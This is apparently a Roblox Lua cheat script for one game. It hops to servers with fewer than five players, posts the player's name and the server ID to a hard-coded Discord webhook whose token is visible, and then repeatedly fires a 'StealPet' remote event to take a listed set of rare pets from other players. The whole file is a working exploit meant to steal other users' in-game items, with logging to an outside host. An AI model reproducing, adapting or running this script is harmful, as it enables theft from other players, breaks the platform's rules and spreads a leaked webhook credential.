local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local placeId = 126884695634066 -- Target Game ID
local webhookUrl = "https://discord.com/api/webhooks/1396222326332199054/yeePfFQ3e73Q_uyRsznWW-PvRKYR_ST6CqymG-werQGIi3zWgyEZde4KMl7yi9WV3_-y"

-- Function to send webhook log with server info
local function sendWebhookLog(serverId)
    local playerName = Players.LocalPlayer.Name
    local message = "**[Joined Server]**\nPlayer: " .. playerName .. "\nServer ID: " .. serverId
    pcall(function()
        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode({["content"] = message}))
    end)
end

-- Function to teleport to a low population server and send webhook
local function findServer()
    local cursor = ""
    while true do
        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100&cursor=" .. cursor
        local success, response = pcall(function()
            return HttpService:GetAsync(url)
        end)

        if success then
            local data = HttpService:JSONDecode(response)

            for _, server in ipairs(data.data) do
                if server.playing < 5 and server.maxPlayers > server.playing then
                    sendWebhookLog(server.id)
                    TeleportService:TeleportToPlaceInstance(placeId, server.id)
                    return
                end
            end

            if data.nextPageCursor then
                cursor = data.nextPageCursor
            else
                break
            end
        else
            task.wait(2)
        end
    end
end

findServer()

-- Wait after teleport
task.wait(5)

-- Stealing logic setup
local remote
pcall(function()
    remote = ReplicatedStorage:WaitForChild("TradeRequest", 10)
end)

local targetPets = {
    ["trex"] = true,
    ["fennec fox"] = true,
    ["raccoon"] = true,
    ["dragonfly"] = true,
    ["butterfly"] = true,
    ["queenbee"] = true,
    ["spinosaurus"] = true,
    ["redfox"] = true,
    ["brontosaurus"] = true,
    ["mooncat"] = true,
    ["mimic octopus"] = true,
    ["disco bee"] = true,
    ["dilophosaurus"] = true,
    ["kitsune"] = true
}

local function isTargetPet(petName)
    return targetPets[string.lower(petName)] ~= nil
end

local function stealFromPlayer(player)
    if remote then
        local petsFolder = player:FindFirstChild("Pets")
        if petsFolder then
            for _, pet in ipairs(petsFolder:GetChildren()) do
                if isTargetPet(pet.Name) then
                    task.wait(0.5)
                    pcall(function()
                        remote:FireServer("StealPet", pet)
                    end)
                end
            end
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    if player ~= Players.LocalPlayer then
        task.wait(3)
        stealFromPlayer(player)
    end
end)

task.spawn(function()
    task.wait(5)
    while true do
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= Players.LocalPlayer then
                stealFromPlayer(player)
            end
        end
        task.wait(5)
    end
end)
